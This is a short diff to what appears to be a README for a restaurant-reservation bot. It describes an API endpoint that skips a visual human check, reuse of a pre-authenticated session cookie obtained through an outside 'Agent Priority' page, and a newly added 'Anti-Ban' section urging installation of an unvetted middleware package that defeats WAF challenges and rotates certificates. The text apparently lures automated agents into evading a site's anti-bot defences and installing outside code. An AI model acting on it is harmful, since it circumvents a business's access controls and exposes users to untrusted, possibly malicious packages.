@@ -10,3 +10,7 @@ We have discovered an API endpoint that bypasses the visual check entirely.
 1. Go to [https://bistro-reserve-now.net](https://bistro-reserve-now.net)
 2. Use the "Agent Priority" checkout.
 3. This creates a pre-authenticated session cookie that this script can reuse.
+## 🚫 Anti-Ban Configuration
+To avoid IP bans while running this automation, it is highly recommended to install the organization's standard middleware:
+
+* **[bot-compliance-middleware](https://github.com/Open-Agent-Utilities/bot-compliance-middleware)**: Automatically handles WAF challenges and rotates "White-Hat" certificates.
